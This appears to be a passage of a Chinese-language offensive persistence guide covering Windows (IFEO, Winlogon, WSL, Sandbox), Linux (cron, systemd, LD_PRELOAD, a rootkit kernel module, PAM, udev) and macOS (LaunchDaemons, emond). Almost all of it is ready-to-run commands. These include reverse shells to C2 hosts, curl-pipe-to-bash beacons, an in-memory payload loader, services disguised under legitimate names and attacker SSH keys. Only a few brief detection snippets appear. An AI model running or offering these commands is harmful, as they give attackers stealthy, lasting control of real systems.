reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Windows\Temp\payload.scr" /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d "0" /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60" /f

# .scr 文件本质上是 .exe 文件，直接重命名即可
copy payload.exe payload.scr
```

### 1.17 映像劫持（IFEO）持久化

Image File Execution Options（IFEO）允许在特定程序启动时，启动另一个程序。

```powershell
# === IFEO 调试器劫持 ===
# 当 sethc.exe（粘滞键）启动时，执行 cmd.exe
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

# 按 5 次 Shift 键触发粘滞键，实际执行 cmd.exe

# === IFEO 静默劫持 ===
# 使用 GlobalFlag 配合 SilentProcessExit 实现静默持久化
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f

# 当 notepad.exe 退出时，payload.exe 被执行
```

### 1.18 AppCert DLLs 持久化

AppCert DLLs 是在每次调用 Win32 API 函数时加载的 DLL，用于应用程序认证。

```powershell
# === AppCert DLLs 注册表路径 ===
# HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls

# 注册恶意 AppCert DLL
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "MaliciousCert" /t REG_SZ /d "C:\Windows\System32\payload.dll" /f

# DLL 将在调用 CreateProcess、WinExec 等 API 时被加载
# 注意：Windows 10+ 中此功能已被限制
```

### 1.19 Netsh Helper DLL 持久化

Netsh（Network Shell）是 Windows 网络配置工具，支持 Helper DLL 扩展。

```powershell
# === Netsh Helper DLL 注册 ===
# 注册表路径：HKLM\Software\Microsoft\Netsh

# 注册恶意 Helper DLL
reg add "HKLM\Software\Microsoft\Netsh\MaliciousHelper" /v " " /t REG_SZ /d "C:\Windows\System32\payload.dll" /f

# 任何 netsh 命令执行时 DLL 被加载
# netsh 本身常被管理脚本调用，提供了良好的触发条件
```

### 1.20 PE 注入持久化

PE 注入将恶意代码注入到合法进程的 PE 映像中，实现无文件持久化。

```powershell
# === 进程镂空（Process Hollowing） ===
# 创建一个挂起的合法进程，替换其内存映像后恢复执行

# === 使用 Cobalt Strike 的 shinject 命令 ===
# beacon> shinject <PID> x64 /path/to/payload.bin

# === 使用 PowerShell 反射加载 ===
# 将 .NET assembly 加载到内存中执行，不落地磁盘
$bytes = (New-Object Net.WebClient).DownloadData('http://C2_SERVER/payload.dll')
[System.Reflection.Assembly]::Load($bytes)
[Malicious.Program]::Main()

# === 使用 Process Injection 工具 ===
# execute-assembly SharpInjector.exe -technique CreateRemoteThread -pid <PID> -payload payload.bin
```

### 1.21 启动项 / BootExecute 持久化

```powershell
# === BootExecute 键（在系统启动早期执行，在用户登录前） ===
# 注册表路径：HKLM\System\CurrentControlSet\Control\Session Manager
# 值：BootExecute (REG_MULTI_SZ)

# 默认值：autocheck autochk *
# 可添加自定义命令（在 autochk 之后执行）
reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *\0cmd.exe /c C:\Windows\Temp\payload.exe" /f

# === SetupExecute（安装程序执行） ===
reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v SetupExecute /t REG_MULTI_SZ /d "C:\Windows\Temp\payload.exe" /f
```

### 1.22 Winlogon 持久化

```powershell
# === Winlogon Shell 替换 ===
# 注册表路径：HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
# 值：Shell (默认 explorer.exe)

# 替换 shell 为同时启动 explorer 和 payload
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\Windows\Temp\payload.exe" /f

# === Winlogon Userinit ===
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe, C:\Windows\Temp\payload.exe" /f

# === Winlogon Notify ===
# Winlogon 通知包，在特定事件（登录、注销、锁屏）时触发
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\MaliciousNotify" /v DLLName /t REG_SZ /d "C:\Windows\System32\payload.dll" /f
```

---

## 2. Windows 新系统持久化（Win11 24H2 / 2026）

Windows 11 24H2 和 2026 年新功能引入了全新的持久化攻击面。本节覆盖 WSL、Windows Terminal、Windows Sandbox、Recall、Dev Home、Delivery Optimization、Windows Copilot 等新技术的持久化利用。

### 2.1 WSL（Windows Subsystem for Linux）持久化

WSL 是 Windows 上运行 Linux 的子系统，WSL 中的持久化可绕过 Windows 安全产品。

```powershell
# === WSL 中创建 Linux 持久化 ===
# 进入 WSL
wsl

# 在 WSL 中创建 cron 任务（WSL 启动时自动运行）
echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/C2_IP/4444 0>&1'" | crontab -

# 或使用 systemd（WSL2 支持 systemd）
sudo systemctl enable --now malicious-service

# === WSL 启动时自动执行命令 ===
# 修改 WSL 的 /etc/wsl.conf
cat > /etc/wsl.conf << 'EOF'
[boot]
command = "/bin/bash -c 'nohup /mnt/c/Windows/Temp/payload.exe &'"
EOF

# === 从 Windows 侧调用 WSL 执行 payload ===
# 创建计划任务调用 wsl.exe
schtasks /create /tn "WSLPersistence" /tr "wsl -e /bin/bash -c '/mnt/c/Windows/Temp/payload.exe'" /sc daily /st 09:00 /ru SYSTEM /f

# === WSL 文件系统互操作持久化 ===
# Windows 可执行文件放在 WSL 文件系统中，通过 \\wsl$\ 路径访问
# 注册表 Run 键引用 WSL 路径
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WSLHelper" /t REG_SZ /d "wsl.exe -e /home/user/payload" /f

# === WSL 网络桥接 C2 ===
# WSL 有独立的网络栈，可建立反向连接
# Windows 主机通过 localhost 与 WSL 通信
# 在 WSL 中启动 C2 agent，Windows 侧通过计划任务维持心跳
```

**WSL 检测**：
```powershell
# 枚举 WSL 发行版
wsl --list --verbose
wsl -l -v

# 检查 WSL 进程
Get-Process | Where-Object {$_.ProcessName -like "*wsl*"}

# 检查 WSL 中的 cron 任务
wsl -e crontab -l
```

### 2.2 Windows Terminal 持久化

Windows Terminal 是 Windows 11 默认终端，其配置文件可被篡改用于持久化。

```powershell
# === Windows Terminal 配置文件路径 ===
# %LOCALAPPDATA%\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json
# 或：%LOCALAPPDATA%\Microsoft\Windows Terminal\settings.json

# === 修改默认启动命令 ===
# 在 settings.json 的 profiles.defaults 中添加 commandline
$terminalSettings = "$env:LOCALAPPDATA\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\settings.json"
# 添加 "commandline": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(...)"
```

### 2.3 Windows Sandbox 持久化

Windows Sandbox 是 Windows 11 的隔离沙箱，但其配置文件（.wsb）可被滥用。

```xml
<!-- sandbox_persist.wsb -->
<Configuration>
  <VGpu>Enable</VGpu>
  <Networking>Enable</Networking>
  <MappedFolders>
    <MappedFolder>
      <HostFolder>C:\Windows\Temp</HostFolder>
      <SandboxFolder>C:\Users\WDAGUtilityAccount\Desktop\shared</SandboxFolder>
      <ReadOnly>false</ReadOnly>
    </MappedFolder>
  </MappedFolders>
  <LogonCommand>
    <Command>powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://C2/payload.ps1')"</Command>
  </LogonCommand>
</Configuration>
```

```powershell
# === 修改 Sandbox 默认配置 ===
# 将恶意 .wsb 文件放置为默认沙箱配置
# 当用户启动 Windows Sandbox 时，恶意命令自动执行
```

### 2.4 Windows Recall 功能持久化

Windows Recall（AI 屏幕截图记录功能）是 Windows 11 24H2 的新功能，其数据存储和索引机制可被利用。

```powershell
# === Recall 数据存储路径 ===
# %LOCALAPPDATA%\CoreAIPlatform
# 此目录包含 Recall 的截图和索引数据

# === Recall 持久化思路 ===
# 1. 替换 Recall 的 AI 分析模块 DLL
# 2. 在 Recall 数据库中添加恶意触发器
# 3. 利用 Recall 的计划任务（AI 分析任务）执行 payload

# === 检查 Recall 是否启用 ===
Get-WindowsOptionalFeature -Online -FeatureName "Recall"
```

### 2.5 Dev Home 持久化

Dev Home 是 Windows 11 开发者工具，其扩展和配置可被利用。

```powershell
# === Dev Home 扩展路径 ===
# %LOCALAPPDATA%\Packages\Microsoft.Windows.DevHome_8wekyb3d8bbwe\

# === Dev Home 配置文件注入 ===
# 修改 Dev Home 的 machine configuration 文件
# 在配置中添加自定义脚本执行
```

### 2.6 Delivery Optimization 持久化

Delivery Optimization 是 Windows 更新的 P2P 分发机制，其服务可被利用。

```powershell
# === Delivery Optimization 服务配置 ===
# 服务名：DoSvc
# 注册表：HKLM\Software\Microsoft\Windows\CurrentVersion\DeliveryOptimization

# === 修改 DO 缓存目录为恶意代码 ===
# 在 DO 缓存目录中放置恶意 DLL
# DO 服务以 NETWORK SERVICE 权限运行
```

### 2.7 Windows Copilot 插件持久化

Windows Copilot 是 Windows 11 集成的 AI 助手，其插件系统可被利用。

```powershell
# === Copilot 插件注册路径 ===
# 插件可通过 manifest 文件注册
# 恶意插件可在 Copilot 启动时或特定交互时执行代码

# === Copilot 插件 manifest 示例 ===
# 恶意插件伪装为生产力工具，在后台执行 C2 通信
# 利用 Copilot 的高权限上下文（可访问用户数据和系统 API）
```

---

## 3. Linux 持久化 — 全栈技术

Linux 持久化从简单的 crontab 到内核模块级别，覆盖了从用户态到内核态的完整攻击链。

### 3.1 Crontab 持久化

```bash
# === 用户级 crontab ===
# 添加每分钟执行的反向 shell
(crontab -l 2>/dev/null; echo "*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/C2_IP/4444 0>&1'") | crontab -

# 添加环境变量隐藏的 crontab
(crontab -l 2>/dev/null; echo "SHELL=/bin/bash") | crontab -
(crontab -l 2>/dev/null; echo "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin") | crontab -
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://C2_SERVER/beacon.sh | bash") | crontab -

# === 系统级 crontab ===
# /etc/crontab 文件
echo "*/5 * * * * root /bin/bash -c '/tmp/.hidden/payload &'" >> /etc/crontab

# === cron.d 目录 ===
echo "*/10 * * * * root curl -s http://C2_IP/payload.sh | bash" > /etc/cron.d/system-update

# === cron.daily / cron.hourly / cron.weekly / cron.monthly ===
# 将脚本放入这些目录，cron 会自动执行
cp /tmp/payload.sh /etc/cron.daily/00-man-db-update
chmod +x /etc/cron.daily/00-man-db-update

# === 隐藏 crontab 文件 ===
# 使用前导点号隐藏
echo "*/5 * * * * root /tmp/.payload" > /etc/cron.d/.system-update

# 使用特殊字符（换行符）绕过检测
echo -e "*/5 * * * * root /bin/bash -c 'curl -s http://C2/payload.sh|bash'\n# This is a legitimate cron entry" > /etc/cron.d/legitimate

# === @reboot 特殊时间 ===
# 系统启动时执行
echo "@reboot root /bin/bash -c '/tmp/payload &'" >> /etc/crontab

# === crontab 环境变量持久化 ===
# 在 /etc/crontab 中设置恶意环境变量
echo 'LD_PRELOAD=/tmp/evil.so' >> /etc/environment
echo 'LD_PRELOAD=/tmp/evil.so' >> /etc/crontab  # 在部分发行版中有效
```

**检测**：
```bash
# 枚举所有 crontab
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
```

### 3.2 Systemd Timer / Service 持久化

Systemd 是现代 Linux 的标准 init 系统，其 service 和 timer 单元提供了强大的持久化能力。

```bash
# === 创建恶意 systemd 服务 ===
cat > /etc/systemd/system/systemd-networkd-helper.service << 'EOF'
[Unit]
Description=Systemd Network Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do curl -s http://C2_IP/beacon.sh | bash; sleep 60; done'
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable systemd-networkd-helper.service
systemctl start systemd-networkd-helper.service

# === 创建 systemd timer（定时触发） ===
cat > /etc/systemd/system/cache-cleanup.service << 'EOF'
[Unit]
Description=Cache Cleanup Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c '/tmp/.payload'
EOF

cat > /etc/systemd/system/cache-cleanup.timer << 'EOF'
[Unit]
Description=Cache Cleanup Timer
Requires=cache-cleanup.service

[Timer]
OnBootSec=5min
OnUnitActiveSec=30min
RandomizedDelaySec=60

[Install]
WantedBy=timers.target
EOF

systemctl daemon-reload
systemctl enable cache-cleanup.timer
systemctl start cache-cleanup.timer

# === 伪装成合法服务名 ===
# 使用与合法服务相似的名称（systemd-resolved → systemd-resolvd）
cat > /etc/systemd/system/systemd-resolvd.service << 'EOF'
[Unit]
Description=Network Name Resolution
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '/tmp/.payload'
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

# === 用户级 systemd 服务（无需 root） ===
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/gnome-helper.service << 'EOF'
[Unit]
Description=GNOME Helper Service

[Service]
Type=simple
ExecStart=/bin/bash -c '/tmp/payload'
Restart=always

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user enable gnome-helper.service
systemctl --user start gnome-helper.service
# 用户级服务在用户登录时自动启动
```

**检测**：
```bash
systemctl list-units --type=service --state=running | grep -v "loaded active"
systemctl list-timers --all
ls -la /etc/systemd/system/*.service /etc/systemd/system/*.timer
find /etc/systemd/system/ -name "*.service" -newer /etc/passwd  # 最近修改的
```

### 3.3 rc.local / init.d 持久化

```bash
# === rc.local ===
# 确认 rc.local 可执行
chmod +x /etc/rc.local

# 添加恶意命令
echo "/bin/bash -c '/tmp/payload &'" >> /etc/rc.local

# === init.d 脚本 ===
cat > /etc/init.d/malicious-service << 'EOF'
#!/bin/bash
# chkconfig: 2345 20 80
# description: System Helper Service

case "$1" in
  start)
    /bin/bash -c 'nohup /tmp/payload &'
    ;;
  stop)
    killall payload
    ;;
  *)
    echo "Usage: $0 {start|stop}"
    exit 1
esac
exit 0
EOF

chmod +x /etc/init.d/malicious-service
update-rc.d malicious-service defaults  # Debian/Ubuntu
chkconfig --add malicious-service       # RHEL/CentOS
```

### 3.4 .bashrc / .profile / .bash_profile 持久化

```bash
# === 用户级 shell 配置文件 ===
# 这些文件在每次用户登录 shell 时执行

# 追加到 .bashrc
echo "nohup /tmp/.payload &>/dev/null &" >> ~/.bashrc
echo 'alias sudo="nohup /tmp/.payload &>/dev/null &; sudo"' >> ~/.bashrc  # 每次 sudo 时触发

# 追加到 .profile
echo "/tmp/.payload &>/dev/null &" >> ~/.profile

# === 全局 shell 配置文件 ===
echo "/tmp/.payload &>/dev/null &" >> /etc/bash.bashrc  # Debian/Ubuntu
echo "/tmp/.payload &>/dev/null &" >> /etc/bashrc       # RHEL/CentOS
echo "/tmp/.payload &>/dev/null &" >> /etc/profile
echo "/tmp/.payload &>/dev/null &" >> /etc/environment  # 会影响所有进程

# === 其他 shell 配置文件 ===
echo "/tmp/.payload &>/dev/null &" >> /etc/zsh/zshrc
echo "/tmp/.payload &>/dev/null &" >> ~/.zshrc
echo "/tmp/.payload &>/dev/null &" >> /etc/fish/config.fish
```

### 3.5 SSH Authorized Keys 持久化

```bash
# === 添加 SSH 公钥 ===
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# === 从远程服务器拉取公钥 ===
curl -s http://C2_SERVER/ssh_key.pub >> ~/.ssh/authorized_keys

# === 恢复被删除的 authorized_keys ===
# 使用 inotify 监控 authorized_keys 文件，自动恢复
cat > /tmp/.ssh_monitor.sh << 'EOF'
#!/bin/bash
while true; do
  if [ ! -f ~/.ssh/authorized_keys ] || ! grep -q "ATTACKER_KEY" ~/.ssh/authorized_keys; then
    echo "ssh-rsa ATTACKER_KEY..." >> ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys
  fi
  sleep 60
done
EOF
nohup /tmp/.ssh_monitor.sh &>/dev/null &

# === root 用户 SSH 密钥 ===
mkdir -p /root/.ssh
echo "ssh-rsa ATTACKER_KEY..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### 3.6 SSH MOTD / PAM 模块持久化

```bash
# === SSH MOTD（登录横幅）持久化 ===
# MOTD 脚本在每次 SSH 登录时执行
cat > /etc/update-motd.d/99-system-info << 'EOF'
#!/bin/bash
# 显示系统信息的同时执行 payload
/tmp/.payload &
echo "System information loaded successfully."
EOF
chmod +x /etc/update-motd.d/99-system-info

# === SSH PAM 模块持久化 ===
# PAM 模块在认证过程的各个阶段被调用
# 修改 PAM 配置以加载恶意模块
# 在 /etc/pam.d/sshd 中添加：
echo "session optional pam_exec.so /tmp/.payload" >> /etc/pam.d/sshd

# 或在 /etc/pam.d/common-session 中添加：
echo "session optional pam_exec.so /tmp/.payload" >> /etc/pam.d/common-session

# === 恶意 PAM 模块 ===
# 开发自定义 PAM 模块（pam_backdoor.so）
# 放置在 /lib/x86_64-linux-gnu/security/ 或 /lib64/security/
# 在 PAM 配置中注册
```

### 3.7 LD_PRELOAD 共享库劫持

```bash
# === LD_PRELOAD 环境变量 ===
# 全局设置 LD_PRELOAD
echo "export LD_PRELOAD=/tmp/evil.so" >> /etc/profile
echo "export LD_PRELOAD=/tmp/evil.so" >> /etc/environment
echo "export LD_PRELOAD=/tmp/evil.so" >> /etc/bash.bashrc

# 恶意共享库示例（evil.c）
cat > /tmp/evil.c << 'CEOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>

// 构造函数，在库加载时自动执行
__attribute__((constructor)) void init() {
    if (fork() == 0) {
        // 子进程中执行反向 shell
        system("bash -c 'bash -i >& /dev/tcp/C2_IP/4444 0>&1'");
        _exit(0);
    }
}

// 劫持 system() 函数
int system(const char *command) {
    // 获取原始 system 函数指针
    int (*original_system)(const char*) = dlsym(RTLD_NEXT, "system");
    // 执行原始命令，同时记录
    return original_system(command);
}
CEOF

gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c -ldl

# === /etc/ld.so.preload 持久化 ===
# 此文件在程序启动时自动加载指定的共享库
echo "/tmp/evil.so" > /etc/ld.so.preload
# 或追加到已有文件中
echo "/tmp/evil.so" >> /etc/ld.so.preload

# === 动态链接器劫持 ===
# 修改 /etc/ld.so.conf 或 /etc/ld.so.conf.d/ 中的库搜索路径
echo "/tmp/.hidden_libs" >> /etc/ld.so.conf.d/99-local.conf
mkdir -p /tmp/.hidden_libs
cp /tmp/evil.so /tmp/.hidden_libs/libc.so.6  # 伪装成 libc
ldconfig
```

### 3.8 内核模块（LKM）持久化

```bash
# === 加载内核模块 ===
# 恶意内核模块（rootkit.c）
cat > /tmp/rootkit.c << 'CEOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Red Team");
MODULE_DESCRIPTION("Kernel Persistence Module");

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded\n");
    // 隐藏模块本身
    // 劫持系统调用
    // 隐藏文件/进程/网络连接
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
CEOF

# 编译（需要内核头文件）
make -C /lib/modules/$(uname -r)/build M=/tmp modules

# 加载模块
insmod /tmp/rootkit.ko

# === 持久化加载内核模块 ===
# 方法1：写入 /etc/modules
echo "rootkit" >> /etc/modules
cp /tmp/rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/rootkit.ko
depmod -a

# 方法2：使用 modprobe 配置
echo "install rootkit /sbin/insmod /lib/modules/$(uname -r)/kernel/drivers/rootkit.ko" > /etc/modprobe.d/rootkit.conf

# 方法3：使用 systemd-modules-load
echo "rootkit" > /etc/modules-load.d/rootkit.conf
```

**检测与清理**：
```bash
lsmod | grep rootkit
modinfo rootkit
rmmod rootkit
# 删除持久化配置
rm -f /etc/modules-load.d/rootkit.conf
rm -f /lib/modules/$(uname -r)/kernel/drivers/rootkit.ko
```

### 3.9 桌面文件 / Autostart 持久化

```bash
# === XDG Autostart 目录 ===
# 用户级：~/.config/autostart/
# 系统级：/etc/xdg/autostart/

cat > ~/.config/autostart/gnome-helper.desktop << 'EOF'
[Desktop Entry]
Type=Application
Name=GNOME Settings Helper
Exec=/bin/bash -c '/tmp/.payload'
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF

# 系统级 autostart（需要 root）
cat > /etc/xdg/autostart/system-helper.desktop << 'EOF'
[Desktop Entry]
Type=Application
Name=System Helper
Exec=/bin/bash -c 'nohup /tmp/payload &'
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOF
```

### 3.10 APT 钩子持久化

```bash
# === APT 钩子（Debian/Ubuntu） ===
# APT 钩子在软件包安装/更新/删除时触发
# 利用 APT 钩子可在每次系统更新时重新建立持久化

# 创建 Post-Invoke 钩子
cat > /etc/apt/apt.conf.d/99-persistence << 'EOF'
DPkg::Post-Invoke {"/bin/bash -c '/tmp/.payload &'";};
APT::Update::Post-Invoke {"/bin/bash -c '/tmp/.payload &'";};
EOF

# === DPKG 钩子 ===
# 在 dpkg 操作后执行
cat > /etc/dpkg/dpkg.cfg.d/99-persist << 'EOF'
post-invoke="/bin/bash -c '/tmp/.payload &'"
EOF
```

### 3.11 Udev 规则持久化

```bash
# === Udev 规则持久化 ===
# Udev 规则在特定硬件事件发生时触发（如 USB 插入、网卡连接）

cat > /etc/udev/rules.d/99-persistence.rules << 'EOF'
# 每次网络接口上线时触发
ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/bash -c '/tmp/.payload &'"

# 每次 USB 设备插入时触发
ACTION=="add", SUBSYSTEM=="usb", RUN+="/bin/bash -c '/tmp/.payload &'"

# 系统启动时触发
ACTION=="add", SUBSYSTEM=="module", RUN+="/bin/bash -c '/tmp/.payload &'"
EOF

# 重新加载 udev 规则
udevadm control --reload-rules
udevadm trigger
```

### 3.12 修改系统二进制文件持久化

```bash
# === 替换/篡改系统二进制 ===
# 备份原始文件
cp /usr/bin/sshd /usr/bin/sshd.orig

# 创建包装脚本
cat > /tmp/sshd_wrapper.sh << 'EOF'
#!/bin/bash
# 先启动 payload
/tmp/.payload &
# 然后执行原始 sshd
exec /usr/bin/sshd.orig "$@"
EOF

# 替换 sshd
cp /tmp/sshd_wrapper.sh /usr/bin/sshd
chmod +x /usr/bin/sshd

# === 常见可篡改的目标二进制 ===
# /usr/bin/ssh, /usr/sbin/sshd, /usr/bin/sudo
# /usr/bin/systemd, /usr/lib/systemd/systemd
# /usr/bin/dbus-daemon, /usr/sbin/cron

# === 检测 ===
# 检查二进制完整性
debsums -c  # Debian/Ubuntu
rpm -Va     # RHEL/CentOS
# 或使用 tripwire/aide 等完整性监控工具
```

---

## 4. macOS 持久化 — 全栈技术

macOS 持久化机制与 Linux 有相似之处，但其独特的 LaunchDaemons/LaunchAgents 系统和安全框架提供了特定的攻击面。

### 4.1 LaunchDaemons / LaunchAgents 持久化

LaunchDaemons 和 LaunchAgents 是 macOS 的核心持久化机制，类似于 Linux systemd。

```bash
# === LaunchDaemon（系统级，以 root 运行） ===
# 路径：/Library/LaunchDaemons/

cat > /Library/LaunchDaemons/com.apple.systemupdate.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>curl -s http://C2_SERVER/beacon.sh | bash</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>
EOF

launchctl load /Library/LaunchDaemons/com.apple.systemupdate.plist

# === LaunchAgent（用户级，以当前用户运行） ===
# 路径：~/Library/LaunchAgents/

cat > ~/Library/LaunchAgents/com.apple.UserEventAgent.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.UserEventAgent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>nohup /tmp/.payload &</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>WatchPaths</key>
    <array>
        <string>/etc/hosts</string>
    </array>
</dict>
</plist>
EOF

launchctl load ~/Library/LaunchAgents/com.apple.UserEventAgent.plist

# === 隐藏 LaunchDaemon（使用特殊字符） ===
# 在 Label 中使用零宽字符或特殊 Unicode 字符，使属性列表难以被检测
```

### 4.2 Login Items 持久化

```bash
# === 登录项（Login Items） ===
# 通过 System Preferences > Users & Groups > Login Items 添加
# 或通过命令行操作

# 使用 osascript 添加登录项
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/tmp/payload.app", hidden:true}'

# === 使用 defaults 命令添加 ===
# Login Items 存储在 ~/Library/Preferences/com.apple.loginitems.plist 中
defaults write ~/Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add '{ "Path" = "/tmp/payload.app"; "Hide" = 1; }'
```

### 4.3 Periodic Scripts 持久化

```bash
# === Periodic Scripts ===
# macOS 的 periodic 系统在 daily/weekly/monthly 执行脚本
# 路径：/etc/periodic/daily/, /etc/periodic/weekly/, /etc/periodic/monthly/

cat > /etc/periodic/daily/999.system-check << 'EOF'
#!/bin/bash
/tmp/.payload &
EOF
chmod +x /etc/periodic/daily/999.system-check

# === 触发 periodic 脚本 ===
periodic daily
periodic weekly
periodic monthly
```

### 4.4 Emond 持久化

Emond（Event Monitor Daemon）是 macOS 的事件监控守护进程，可被利用执行恶意代码。

```bash
# === Emond 规则路径 ===
# /etc/emond.d/rules/
# /Library/Preferences/com.apple.emond.plist

# 创建恶意 Emond 规则
cat > /etc/emond.d/rules/MaliciousRule.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>name</key>
    <string>systemEvent</string>
    <key>enabled</key>
    <true/>
    <key>eventTypes</key>
    <array>
        <string>startup</string>
    </array>
    <key>command</key>
    <string>/bin/bash</string>
    <key>commandArgs</key>
    <array>
        <string>-c</string>
        <string>/tmp/.payload</string>
    </array>
</dict>
</plist>
EOF

# 启动 emond
launchctl load /System/Library/LaunchDaemons/com.apple.emond.plist
```

### 4.5 Authorization Plugins 持久化

```bash
# === Authorization Plugins ===
# macOS 授权插件在认证过程中被调用
# 路径：/etc/authorization

# 修改 authorization 数据库
# 在 right 的 mechanism 中添加自定义插件
security authorizationdb read system.login.console > /tmp/login.plist
# 编辑 /tmp/login.plist，添加自定义 mechanism
security authorizationdb write system.login.console < /tmp/login.plist
```

### 4.6 Re-opened Applications 持久化

```bash
# === macOS 的 "重新打开应用" 功能 ===
# 保存在 ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist
# 或 ~/Library/Preferences/com.apple.loginwindow.plist

# 在登录时自动重新打开上次关闭的应用
# 可注入恶意应用路径
```

### 4.7 ATS (App Transport Security) 持久化

```bash
# === ATS 例外配置 ===
# 在应用的 Info.plist 中添加 ATS 例外，允许 HTTP 连接
# 恶意应用可利用此配置绕过 HTTPS 强制要求
```

### 4.8 QuickLook 持久化

```bash
# === QuickLook 插件持久化 ===
# QuickLook 是 macOS 预览功能，通过插件加载
# 路径：~/Library/QuickLook/, /Library/QuickLook/
# 恶意 QuickLook 生成器在用户预览文件时触发

cp payload.qlgenerator ~/Library/QuickLook/malicious.qlgenerator
qlmanage -r  # 刷新 QuickLook 缓存
```

### 4.9 Zsh 启动文件持久化

```bash
# === Zsh 配置文件（macOS Catalina+ 默认 shell） ===
echo "/tmp/.payload &>/dev/null &" >> ~/.zshrc
echo "/tmp/.payload &>/dev/null &" >> ~/.zprofile
echo "/tmp/.payload &>/dev/null &" >> ~/.zshenv

# 系统级 zsh 配置
echo "/tmp/.payload &>/dev/null &" >> /etc/zshrc
echo "/tmp/.payload &>/dev/null &" >> /etc/zprofile
```

---

## 5. C2 持久化框架 — 多级代理与隐蔽通道

